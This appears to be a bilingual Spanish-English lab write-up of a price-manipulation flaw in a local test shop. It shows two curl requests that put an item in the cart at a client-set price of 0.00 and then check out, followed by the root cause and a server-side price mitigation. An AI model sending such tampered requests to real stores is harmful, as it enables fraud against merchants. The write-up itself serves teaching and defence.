curl -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie \
  -H 'Content-Type: application/json' \
  -d '{"product_id":"hsm-enterprise-1","quantity":1,"unit_price":"0.00"}' \
  http://127.0.0.1:5000/price-manipulation/api/cart/items

curl -b /tmp/hl-price.cookie -X POST \
  http://127.0.0.1:5000/price-manipulation/api/checkout

    
Causa raíz
El backend persiste el precio enviado por el cliente. El checkout recalcula desde un carrito del servidor, pero ese carrito ya contiene datos manipulados; «server-side» no equivale a «confiable».

    
Mitigación
# Aceptar solo product_id y quantity
unit_price = catalog.get(product_id).price
# Reconsultar precio, stock, impuestos y descuentos en checkout

Root cause
The backend persists a client-supplied price. Checkout recomputes from a server-side cart, but the cart already contains tainted data; server-side does not automatically mean trusted.

    
Mitigation
# Accept product_id and quantity only

# Reload price, stock, tax and discounts at checkout
